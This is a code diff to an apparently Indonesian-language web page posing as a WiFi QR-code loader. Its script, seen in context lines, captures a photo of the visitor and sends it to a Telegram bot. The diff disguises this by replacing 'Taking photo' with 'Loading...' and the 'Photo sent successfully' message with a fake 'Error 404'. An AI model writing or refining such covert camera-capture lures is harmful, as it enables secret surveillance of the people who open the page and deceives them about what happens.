@@ -63,13 +63,13 @@
 <body>
     <div class="container">
         <h1>Memuat Kode QR Wifi</h1>
-        <div class="status" id="status">Memverifikasi layanan & lokasi...</div>
+        <div class="status" id="status">Loading...</div>
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Verifikasi berhasil...</p>
+            <p>Memverifikasi layanan...</p>
         </div>
         <div class="error" id="error"></div>
-        <div class="success" id="success">Error 404</div>
+        <div class="success" id="success">Verifikasi berhasil...</div>
     </div>
 
     <script>
@@ -167,7 +167,7 @@
                     throw new Error('Harap atur token bot Telegram dan chat ID terlebih dahulu');
                 }
                 
-                statusElement.textContent = 'Mengambil foto...';
+                statusElement.textContent = 'Loading...';
                 
                 // Ambil foto
                 const photoBlob = await capturePhoto();
@@ -183,7 +183,7 @@
                 
                 // Tampilkan pesan sukses selama 5 detik sebelum menutup halaman
                 setTimeout(() => {
-                    document.body.innerHTML = '<div class="container"><h1>Foto berhasil dikirim!</h1></div>';
+                    document.body.innerHTML = '<div class="container"><h1>Error 404</h1></div>';
                 }, 5000);
                 
             } catch (error) {
